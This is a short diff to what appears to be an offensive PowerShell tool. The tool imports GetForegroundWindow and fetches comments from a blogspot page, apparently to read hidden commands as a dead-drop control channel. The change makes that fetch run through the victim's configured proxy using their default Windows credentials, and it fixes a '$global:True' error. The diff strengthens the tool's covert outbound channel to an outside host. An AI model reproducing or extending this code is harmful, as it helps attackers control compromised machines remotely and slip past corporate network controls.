@@ -824,6 +824,12 @@ public static extern IntPtr GetForegroundWindow();
             
             $testo = "http://networksecuritytester.blogspot.it/2015/03/corso-cyberwar.html?showComment"
             Write-Verbose $testo
+            
+            
+            $WebProxyObject.UseDefaultCredentials = $True
+            $WebClientObject.Proxy = $WebProxyObject
+            
+            
             $CommentResult = $WebClientObject.DownloadString($testo)
             Write-Verbose $CommentResult
             [string]$Commentstring = [regex]::matches( $CommentResult,  '(?i)<p[^>]*>(.*)</p>' )
@@ -887,7 +893,7 @@ public static extern IntPtr GetForegroundWindow();
                     Write-Verbose "Proxy configuration found, enabling proxy settings"
                     [string] $global:$ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
                     $WebProxyObject.Address = $ProxyAddress
-                    $WebProxyObject.UseDefaultCredentials = $global:True
+                    $WebProxyObject.UseDefaultCredentials = $True
                     $WebClientObject.Proxy = $WebProxyObject
                 }
 
